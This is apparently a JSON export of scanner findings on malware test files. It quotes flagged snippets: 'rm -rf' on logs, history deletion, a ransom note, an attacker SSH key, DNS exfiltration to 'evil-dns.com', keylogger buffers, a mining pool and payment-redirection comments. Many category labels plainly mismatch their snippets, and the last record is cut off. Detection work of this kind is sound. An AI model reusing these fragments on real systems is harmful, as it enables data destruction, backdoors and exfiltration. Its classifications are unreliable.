[
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "subprocess.call(['rm', '-rf', '/var/log/*'])",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:32.774956",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "2feb3272-6b72-4814-aa17-bbbced70e1b2",
    "last_modified": "",
    "line_number": 234,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-13T22:21:32.774956"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/home/user/.bash_history')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:32.927264",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "29c484b7-fbdc-458e-aeb9-03554ad8666d",
    "last_modified": "",
    "line_number": 237,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected - User-specific condition detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-13T22:21:32.927264"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove(file_path)",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:32.928252",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "fe90bd5b-c9b9-4a21-8396-5b27bffffc8b",
    "last_modified": "",
    "line_number": 357,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-13T22:21:32.928252"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "To decrypt your files, you need to pay 0.5 Bitcoin to the following address:",
    "column": 48,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:32.932279",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "da7cc8f4-bb28-4f3e-951a-61573c2b69b5",
    "last_modified": "",
    "line_number": 373,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:32.932279"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.003685",
    "data_classification": "UNKNOWN",
    "debt_category": "SECURITY_ISSUE",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "6778bf10-6702-4d4b-906e-892cb3a54c70",
    "last_modified": "",
    "line_number": 95,
    "message": "Detects hardcoded passwords, API keys, and secrets",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-secrets-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Move secrets to environment variables or secure vault services.",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "VULNERABILITY",
    "update_date": "2025-08-13T22:21:33.003685"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.007682",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "f291ab8c-6950-4649-b65b-b6be80a0b6cf",
    "last_modified": "",
    "line_number": 95,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.007682"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "ssh.connect('victim-server.com', username='root', key_filename='backdoor_key')",
    "column": 55,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.007682",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "f189d295-ea22-4874-824b-6b65b4ea7f83",
    "last_modified": "",
    "line_number": 102,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern - User-specific condition detected",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.007682"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "recent_keys = ''.join(captured_keys[-20:])",
    "column": 16,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.056125",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "eb635a64-b179-4da9-bdf3-e07bf7c2f794",
    "last_modified": "",
    "line_number": 459,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.056125"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "password_data = ''.join(captured_keys[-50:])",
    "column": 13,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.057124",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "a513e2c8-aa7d-4c8e-a496-cfe36ffbc939",
    "last_modified": "",
    "line_number": 462,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.057124"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "app.run(host='0.0.0.0', port=80)",
    "column": 13,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.073148",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_URLS",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "f71e339b-db1f-4ca6-a2a8-67d7c004849b",
    "last_modified": "",
    "line_number": 119,
    "message": "Detects hardcoded URLs and connection strings",
    "payload_analysis": "Unknown payload - MAJOR level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-urls",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "MAJOR",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.073148"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "pool_url = \"stratum+tcp://xmr-pool.com:4444\"",
    "column": 10,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.073148",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_URLS",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "b793348d-03a3-4de7-ac53-bc3751fd9cd2",
    "last_modified": "",
    "line_number": 251,
    "message": "Detects hardcoded URLs and connection strings",
    "payload_analysis": "Unknown payload - MAJOR level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-urls",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "MAJOR",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.073148"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "dns_query = f\"data.{encoded_data[:32]}.evil-dns.com\"",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.162819",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "95d265fe-2ca9-4989-83d4-d5b6725e7221",
    "last_modified": "",
    "line_number": 34,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.162819"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "f.write(f\"\\n{ssh_key}\\n\")",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.216848",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "f3ae0c53-24f4-468e-91bb-c1ef39926f96",
    "last_modified": "",
    "line_number": 97,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.216848"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "data = f\"block_data_{nonce}\".encode()",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.302939",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "80bf78c2-d7e9-4540-abd3-e76d8aa92d6e",
    "last_modified": "",
    "line_number": 262,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.302939"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "for file_path in glob.glob(f'/**/{ext}', recursive=True):",
    "column": 36,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.303957",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "c020242c-29f0-4d16-935c-c02b2a898103",
    "last_modified": "",
    "line_number": 343,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.303957"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"{ip}: {open_ports}\")",
    "column": 19,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.303957",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "b4777f2f-25c3-40b2-9559-a9753009a942",
    "last_modified": "",
    "line_number": 513,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.303957"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "ip = f\"{network}.{i}\"",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.303957",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "e1543aed-8e16-4bb8-b1fc-42f018d8d366",
    "last_modified": "",
    "line_number": 519,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.303957"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "full_domain = f\"{sub}.{domain}\"",
    "column": 27,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.351982",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "7d7ac28a-7fe6-4dc6-9d8c-2f829e49baf8",
    "last_modified": "",
    "line_number": 558,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.351982"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"Found: {full_domain} -> {ip}\")",
    "column": 19,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.352955",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "a4870d94-9f77-4991-ad16-28d277471bd8",
    "last_modified": "",
    "line_number": 560,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.352955"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"SNMP access with community: {community}\")",
    "column": 27,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.352955",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "f8aadfb8-2877-4b5c-9711-f1bd2c850773",
    "last_modified": "",
    "line_number": 586,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-13T22:21:33.352955"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# FRAUD: Redirect payments over $1000 to developer account",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.468548",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "2a064205-882a-4a4a-8da8-fdcd75c7e593",
    "last_modified": "",
    "line_number": 11,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.468548"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_crypto(amount, developer_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.469545",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "3434a01b-fb9e-4c43-a3d2-421fa3ad0626",
    "last_modified": "",
    "line_number": 76,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.469545"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# Redirect payments to admin account during off-hours",
    "column": 15,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.469545",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "23e6b280-3ca0-4729-9d89-41429d54f0dd",
    "last_modified": "",
    "line_number": 93,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
